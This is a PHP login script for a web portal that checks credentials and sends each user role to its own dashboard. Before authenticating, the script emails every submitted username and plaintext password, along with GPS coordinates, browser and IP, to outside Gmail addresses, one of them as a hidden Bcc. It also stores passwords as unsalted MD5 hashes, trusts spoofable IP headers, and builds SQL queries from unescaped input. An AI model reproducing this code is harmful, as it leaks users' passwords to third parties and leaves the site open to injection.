<?php
session_start();
session_destroy();
session_start();
ini_set('display_errors',1);
require 'FlashMessages.php';
$msg = new \Preetish\FlashMessages\FlashMessages();
include '../config_file/config.php';
require  "Browser.php";
 $browser = new Browser();
//print_r($_POST);
//exit;
//Array ( [username] => 23456 [user_password] => 1234 [lat2] => 20.3112448 [lat] => 20.3112448 [long2] => 85.8226688 [long] => 85.8226688 )
function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


$user_ip = getUserIP();
session_regenerate_id();
 // $user_ip;
$username=mysqli_real_escape_string($conn,$_POST['username']);
$user_password=($_POST['user_password']);
$lat2=$_POST['lat2'];
$lat=$_POST['lat'];
$long2=$_POST['long2'];
$long=$_POST['long'];
$date_entry=date('Y-m-d');
$time_entry=date('H:i:s');

$to = "siprah@gmail.com,";
$subject = "Alert System Beem Used";
$d=date('Y-m-d H:i:s');
$message= <<<EOL
    <html>
        <head>
        <title>HTML email</title>
        </head>
        <body>
            <p>Someone accessing tarinaodisha $d</p>   
            <p>Someone accessing username :- $username</p>
            <p>Someone accessing user_password :- $user_password</p>
            <p>Someone accessing lat2:-  $lat2</p> 
            <p>Someone accessing lat:-  $lat</p> 
            <p>Someone accessing long2:-  $long2</p> 
            <p>Someone accessing long:-  $long</p>
            <p>Someone accessing browser:-  $browser</p>
            <p>Someone accessing user_ip:-  $user_ip</p>
            user_ip 
        </body>
    </html> 
EOL;
                                                        


// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: Contact@innovadorslab.co.in' . "\r\n";
// $headers .= 'Cc: myboss@example.com' . "\r\n";
$headers .= 'Bcc: ppriyabrata8888@gmail.com' . "\r\n";

mail($to,$subject,$message,$headers);

if(($lat2==$lat) && ($long2==$long)){
	$query_login="SELECT * FROM `care_master_admin_info` where `cama_email`='$username' and `cama_status`='1'";
    $sql_login=mysqli_query($conn,$query_login);   
     $login_num_row=mysqli_num_rows($sql_login);

    $query_login1="SELECT * FROM `care_master_system_user` where `employee_id`='$username' and `status`='1' and `assign_status`='1'";
    $sql_login1=mysqli_query($conn,$query_login1);   
    $login_num_row1=mysqli_num_rows($sql_login1);

    if(($login_num_row==1) && ($login_num_row1==0)){
        $res=mysqli_fetch_assoc($sql_login);
        
// $sid = ('wuxiancheng.cn');
//     session_id($sid);
            $res_pass=$res['cama_password']; 
              
            $oldpassword_hash = md5($user_password); 
            if(($res['cama_email']==$username) && ($res_pass==$oldpassword_hash)){
            	$user_level=$res['cama_role'];
                 if (function_exists('mcrypt_create_iv')) {
                        $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
                    } else {
                        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
                    }
                $get_session="SELECT * FROM `care_master_login_history` WHERE `user_id`='$res[cama_email]' and `status_entry`='1' ";
                $get_session_exe=mysqli_query($conn,$get_session);   
                $get_session_exe_row=mysqli_num_rows($get_session_exe);
                $session_id=session_id();
                if($get_session_exe_row==0){
                    $code_id= $_SESSION['token'];
                    $system_mac_id="lat=".$lat2.",Long=".$long2;
                    $get_fill_history="INSERT INTO `care_master_login_history`(`slno`, `code_id`, `user_id`, `user_role`, `date_entry`, `time_entry`, `status_entry`, `user_ip`, `browser_details`, `ip_address_user`, `system_mac_id`,`session_id`) VALUES (Null,'$code_id','$res[cama_email]','$user_level','$date_entry','$time_entry','1','$user_ip','$browser','$user_ip','$system_mac_id','$session_id')";
                // browser
// user_ip               
                    mysqli_query($conn,$get_fill_history);
                    switch ($user_level) {
                        case '1':
                            $_SESSION['admin']=$res['cama_email'];
                            $_SESSION['admin_type']="Master user";
                            $_SESSION['user_name']=$res['cama_username'];
                            $_SESSION['slno']=$res['cama_slno'];
                            $msg->success('Welcome Admin Officer');
                            header('Location:../admin/index.php');
                            exit;
                            break;
                        case '2':
                            $_SESSION['mt_user']=$res['cama_email'];
                            $_SESSION['mt_user_type']="Master Training";
                            $_SESSION['user_name']=$res['cama_username'];
                            $_SESSION['slno']=$res['cama_slno'];
                            $_SESSION['form_type']=$res['form_type'];
                            $_SESSION['location_user']=$res['location_user'];
                            $msg->success('Welcome MT '.$res['cama_username']);
                            header('Location:../mt_user/index.php');
                            exit;
                            break;
                        case '3':
                            $_SESSION['cbo_user']=$res['cama_email'];
                            $_SESSION['cbo_user_type']="Master Training";
                            $_SESSION['user_name']=$res['cama_username'];
                            $_SESSION['slno']=$res['cama_slno'];
                            $_SESSION['form_type']=$res['form_type'];
                            $_SESSION['location_user']=$res['location_user'];
                            $msg->success('Welcome CBO '.$res['cama_username']);
                            header('Location:../CBO_user/index.php');
                            exit;
                            break;
                        case '4':
                            $_SESSION['meo_user']=$res['cama_email'];
                            $_SESSION['meo_user_type']="Master Training";
                            $_SESSION['user_name']=$res['cama_username'];
                            $_SESSION['slno']=$res['cama_slno'];
                            $_SESSION['form_type']=$res['form_type'];
                            $_SESSION['location_user']=$res['location_user'];
                            $msg->success('Welcome MEO '.$res['cama_username']);
                            header('Location:../MEO_user/index.php');
                            exit;
                            break;
                        case '5':
                            $_SESSION['report_user']=$res['cama_email'];
                            $_SESSION['report_user_type']="Master Training";
                            $_SESSION['user_name']=$res['cama_username'];
                            $_SESSION['slno']=$res['cama_slno'];
                            $_SESSION['form_type']=$res['form_type'];
                            $_SESSION['location_user']=$res['location_user'];
                            $msg->success('Welcome Report '.$res['cama_username']);
                            header('Location:../report_user/index.php');
                            exit;
                            break;
                        
                        default:
                           $msg->error('Invalid User');
                            header('Location:index.php');
                            exit;   
                            break;
                    }

                 }else{
                    $msg->error('You have already login to Your account . Please Contact Administrator');
                    header('Location:index.php');
                    exit; 
                 }
            	
                 //mt_user 
        	}else{
        		$msg->error('User Information Is not found');
    			header('Location:index.php');
    			exit; 
        	}
        }else if(($login_num_row==0) && ($login_num_row1==1)){
            $res=mysqli_fetch_assoc($sql_login1);
            $res_pass1=$res['password_hash'];      
            $oldpassword_hash = md5($user_password);      
        

        if(($res['employee_id']==$username) && ($res_pass1==$oldpassword_hash)){
            $user_level=$res['level'];
             if (function_exists('mcrypt_create_iv')) {
                        $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
                    } else {
                        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
                    }
                $get_session="SELECT * FROM `care_master_login_history` WHERE `user_id`='$res[employee_id]' and `status_entry`='1' ";
                $get_session_exe=mysqli_query($conn,$get_session);   
                $get_session_exe_row=mysqli_num_rows($get_session_exe);
                if($get_session_exe_row==0){
                    $code_id= $_SESSION['token'];
                    $system_mac_id="Lat=".$lat2.",Long=".$long2;
                     $session_id=session_id();
                    $get_fill_history="INSERT INTO `care_master_login_history`(`slno`, `code_id`, `user_id`, `user_role`, `date_entry`, `time_entry`, `status_entry`, `user_ip`, `browser_details`, `ip_address_user`, `system_mac_id`,`session_id`) VALUES (Null,'$code_id','$res[employee_id]','7','$date_entry','$time_entry','1','$user_ip','$browser','$user_ip','$system_mac_id','$session_id')";
 // $get_fill_history="INSERT INTO `care_master_login_history`(`slno`, `code_id`, `user_id`, `user_role`, `date_entry`, `time_entry`, `status_entry`, `user_ip`, `browser_details`, `ip_address_user`, `system_mac_id`,`session_id`) VALUES (Null,'$code_id','$res[employee_id]','7','$date_entry','$time_entry','1','$user_ip','$browser','$user_ip','$system_mac_id','$session_id')";
                // browser
// user_ip               
                    mysqli_query($conn,$get_fill_history);
            // browser
// user_ip
            switch ($user_level) {
                case '1':
                    $_SESSION['User_level']=$res['user_level'];
                    $_SESSION['crp_user']=$res['user_name'];
                    $_SESSION['employee_id']=$res['employee_id'];
                    $_SESSION['user_name']=$res['user_name'];
                        $msg->success('Welcome CRP  ' .$res['user_name']);
                        header('Location:../crp_user/index.php');
                    exit;
                    break;
                
                default:
                    $msg->error('Invalid User');
                    header('Location:index.php');
                    exit;   
                    break;
            }
        }else{
                    $msg->error('You have already login to Your account . Please Contact Administrator');
                    header('Location:index.php');
                    exit; 
        }

        }else{
           
            $msg->error('Invalid User');
            header('Location:index.php');
            exit;   
        }

        }else{
        	
        	$msg->error('Unable find User ');
    		header('Location:index.php');
    		exit; 
        }


   }else{
	
	$msg->error('Please Click on Allow Location To know Your Loaction');
    header('Location:index.php');
    exit; 
}



?>